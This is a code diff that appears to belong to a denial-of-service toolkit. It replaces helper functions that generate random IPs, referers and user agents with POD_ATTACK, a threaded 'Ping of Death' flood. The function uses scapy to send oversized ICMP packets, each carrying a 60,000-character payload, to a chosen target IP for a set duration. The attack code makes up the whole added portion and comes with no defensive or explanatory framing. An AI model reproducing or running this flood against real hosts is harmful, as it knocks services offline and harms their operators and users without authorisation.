@@ -22,24 +22,46 @@
 # OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
 # SOFTWARE.
 
-import json
 import random
+import time
+from scapy.all import IP, ICMP, sendp, send, fragment, conf
+from threading import Thread
+# Import modules for POD flood
+import tools.randomData as randomData
 
-# Get random IP
-def random_IP():
-    ip = []
-    for _ in range(0, 4):
-        ip.append(str(random.randint(1,255)))
-    return ".".join(ip)
+def POD_ATTACK(threads, attack_time, target):
+	# Finish
+	global FINISH
+	FINISH = False
 
-# Get random referer
-def random_referer():
-    with open("tools/other/referers.txt", 'r') as referers:
-    	referers = referers.readlines()
-    return random.choice(referers)
+	target_ip = target
 
-# Get random user agent
-def random_useragent():
-    with open("tools/other/user_agents.json", 'r') as agents:
-        user_agents = json.load(agents)["agents"]
-    return random.choice(user_agents)
+	print("\033[1;34m"+"[*]"+"\033[0m"+" Starting POD attack...")
+	
+	threads_list = []
+
+	# POD flood
+	def pod_flood():
+		global FINISH
+		payload = random.choice(list("1234567890qwertyuiopasdfghjklzxcvbnm")) * 60000
+		packet  = IP(dst = target_ip) / ICMP(id = 65535, seq = 65535) / payload
+
+		while not FINISH:
+			for i in range(16):
+				send(packet, verbose = False)
+				print("\033[1;32m"+"[+]"+"\033[0m"+" Packet was sent!")
+
+	# Start threads
+	for thread in range(0, threads):
+		print("\033[1;34m"+"[*]"+"\033[0m"+" Staring thread " + str(thread) + "...")
+		t = Thread(target = pod_flood)
+		t.start()
+		threads_list.append(t)
+	# Sleep selected secounds
+	time.sleep(attack_time)
+	# Terminate threads
+	for thread in threads_list:
+		FINISH = True
+		thread.join()
+	
+	print("\033[1;33m"+"[!]"+"\033[0m"+" Attack completed.")
